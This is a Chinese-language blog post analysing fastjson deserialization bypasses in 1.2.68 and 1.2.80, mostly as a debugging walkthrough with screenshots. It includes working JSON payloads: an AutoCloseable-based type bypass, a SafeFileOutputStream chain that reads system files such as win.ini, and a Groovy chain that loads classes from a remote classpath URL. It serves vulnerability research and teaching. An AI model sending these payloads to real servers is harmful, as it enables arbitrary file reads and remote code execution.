---
layout: post
date: 2025-8-8
title: "fastjson(1.2.68-1.2.80)反序列化-分析-利用"
author: "XinYiSleep"
category: Java
---
<h1 id="pCrd7">一.基本信息</h1>

```
今天我们来学习1.2.68和1.2.80中的绕过，一个一个来先看看1.2.68。
1.2.68包
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.68</version>
        </dependency>
1.2.80包
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.80</version>
        </dependency>
```
<h1 id="Vq7R8">二:1.2.68分析</h1>

```
1.2.68是无需开启 AutoType  ，直接能绕过`CheckAutoType()`方法的，绕过原理是执行第二次checkAutoType()方法中第二个参数expectClass造成的绕过，
下面我们自己模拟执行一下poc(代码一，代码二)。也是能成功执行的图一。
```
```java
String payload1 = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.example.fastjsondemo.Fats68\",\"name\":\"calc\"}";
JSON.parseObject(payload1);
```

```java
package com.example.fastjsondemo;

import java.io.FileOutputStream;
import java.io.IOException;

public class Fats68 implements AutoCloseable{
    private String name;


    public void setName(String name) throws Exception {
        Runtime.getRuntime().exec(name);
    }

    public Fats68() throws Exception {
        System.out.println("构造方法");
    }

    @Override
    public void close() throws Exception {

    }
}

```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/1.png)

```
下面我们debug分析一下，这里就直接看绕过部分了，先看第一个checkAutoType，在图一中我们可以看到expectClass是null,typeName也就是获取到第一个@type内容
java.lang.AutoCloseable，一直走到图二直接从mappings这个Map缓存中获取到了内容，下面就是图三expectClass是null所以直接就返回clazz了。
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/2.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/3.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/4.png)

```
走出来之后接着就会进入getDeserializer来获取反序列化器`JavaBeanDeserializer`图一，跟进去看看 图二，
其实没必要在跟进去了没啥重要操作我直接截图带过图三图四，接着进入`JavaBeanDeserializer`的deserialze方法进行反序列化操作图四。
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/5.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/6.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/7.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/8.png)

```
进来之后一直走到第二次checkAutoType，这里可以看到第一个参数ref就是第二个json的
@type也就是com.example.fastjsondemo.Fats68，第二个参数是expectClass也就是java.lang.AutoCloseable图一，
跟进去因为我们自己设置的这个不在白名单也不再黑名单会一直走到图二，进入loadClass之后因为cache是fales所以不会put到mappings中直接返回了图三。
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/9.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/9.5.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/10.png)

```
下面就到了最关键的代码了，也就是图一的代码，可以看到expectClass不等于null就往下走
TypeUtils.addMapping(typeName, clazz);这个代码是可以直接put到mappings这个白名单的，expectClass.isAssignableFrom(clazz)，
这个代码也就是说判断clazz是不是expectClass的子类或者实现类，我们知道这里进行了第二次的checkAutoType其中第二个参数也就是expectClass他不就是
java.lang.AutoCloseable吗？没错是这个掉毛，那么师傅就要问了那么是不是我可以写成任意类只要clazz实现或者他的子类就可以呢？
答案是不可以的，因为你不要忘记，我们能走到第二个checkAutoType完全是依靠第一个checkAutoType的白名单这个白名单也就是poc中第一
个@type也就是java.lang.AutoCloseable，那么师傅又要问了那我能不能是这个白名单的任意类呢？答案是 部分可以，就比如代码一代码二。

```

```java
String payload1 = "{\"@type\":\"java.lang.NullPointerException\",\"@type\":\"com.example.fastjsondemo.Fats68\",\"name\":\"calc\"}";
JSON.parseObject(payload1);
```

```java
package com.example.fastjsondemo;

import java.io.FileOutputStream;
import java.io.IOException;

public class Fats68 extends Throwable {
    private String name;


    public void setName(String name) throws Exception {
        Runtime.getRuntime().exec(name);
    }

    public Fats68() throws Exception {
        System.out.println("构造方法");
    }
}

```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/11.png)

```
我们接着看，put到mappings中之后就返回了，后面就开始进行反序列化了，有很多师傅
肯定会有疑问，要是从我讲1.2.24看起的师傅应该没啥问题的，那就是没办法进入deserialze，这里其实很简单在测试的类上面写一个Getter的Map方法就行，
下面跟不跟都无所谓和之前24区别不是很大，进入之后执行了createInstance方法然后进行反射执行无参构造图一，之后返回出来在执行
fieldDeser.setValue(object, fieldValue);执行Setter也是反射执行的就不截图了，ok到这里基本上分析就结束了。
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/12.png)

<h1 id="B9dNK">三.真实利用</h1>

```
上面那个只是本地测试，也就是绕过姿势，在真实环境中怎么可能有我上面代码直接让你命令执行，所以我们得去找利用链，现在我们是有条件的，那就是必须实AutoCloseable 
接口的才可以。

```

<h3 id="A0OjZ">3.1：复制文件导致任意文件读取链</h3>

```
首先需要引入依赖包aspectjtools代码一，利用的类是 SafeFileOutputStream  ，我们现进去看看是否复合条件图一，接着我们查看构造方法图二，
这里39行可以看到存在copy操作，首先我们需要targetPath是一个不存在的目录(为了方便理解我贴出来代码二),来走进这个if,this.temp就是 
this.createTempFile(tempPath);写一个真实目录文件，就复制了。
```

```java
<dependency>  
     <groupId>org.aspectj</groupId>  
     <artifactId>aspectjtools</artifactId>  
     <version>1.9.6</version>  
</dependency>
```

```java
public SafeFileOutputStream(String targetPath, String tempPath) throws IOException {
        this.failed = false;
        this.target = new File(targetPath);
        this.createTempFile(tempPath);
        if (!this.target.exists()) { //首先我们需要targetPath是一个不存在的目录
            if (!this.temp.exists()) {
                this.output = new BufferedOutputStream(new FileOutputStream(this.target));
                return;
            }

            this.copy(this.temp, this.target);
        }

        this.output = new BufferedOutputStream(new FileOutputStream(this.temp));
    }
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/13.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/14.png)

```
这里就直接看poc。
```

```java
String payload1 = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\"targetPath\":\"C:/Users/xxxx/Desktop/java测试/Fastjsondemo/1.txt\",\"tempPath\":\"C:/Windows/win.ini\"}";
JSON.parseObject(payload1);
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.68/15.png)

<h3 id="nAk7x">3.2：写文件链</h3>
```java
。。。。。
```

<h1 id="D5RPP">四.1.2.80浅析-利用</h1>

```
这里是针对1.2.68绕过，其中1.2.80中把`java.lang.Runnable`，`java.lang.Readable` 和 `java.lang.AutoCloseable`写入到了黑名单，
也就是1.2.68通过java.lang.AutoCloseable绕过的但是现在已经不行了，不过我在上面1.2.68上面一嘴java.lang.Exception，
也是可以绕过获取新的反序列化器的图一。
```
![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.80/1.png)



<h3 id="ujpBR">4.1 groovy 链</h3>
```
这个利用链需要执行两次，第一次使用1.2.68上面分析的需要先Put到缓存中，org.codehaus.groovy.control.CompilationFailedException，
这里要讲的是CompilationFailedException类构造方法第二个参数类型是ProcessingUnit这个类导致这个类也put到了缓存中图一，
org.codehaus.groovy.tools.javac.JavaStubCompilationUnit这个类是org.codehaus.groovy.control.ProcessingUnit的子类所以也可以绕过的，
接着就是JavaStubCompilationUnit类的构造方法config参数类型是org.codehaus.groovy.control.CompilerConfiguration， 最后就是groovy的反序列化链了。
后面的自己要跟。
```

```java
String payload1 = "{\"@type\":\"java.lang.Exception\",\"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\"unit\":{}}";
try {
    JSON.parseObject(payload1);
} catch (Exception ignored) {
    String payload2 = "{" +
            "\"@type\":\"org.codehaus.groovy.control.ProcessingUnit\"," +
            "\"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\"," +
            "\"config\":{" +
            "  \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\"," +
            "  \"classpath\":\"http://127.0.0.1:8081/\"" +
            "}," +
            "\"gcl\":null," +
            "\"destDir\": \"/\"}";
    JSON.parseObject(payload2);
}
}
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.80/2.png)

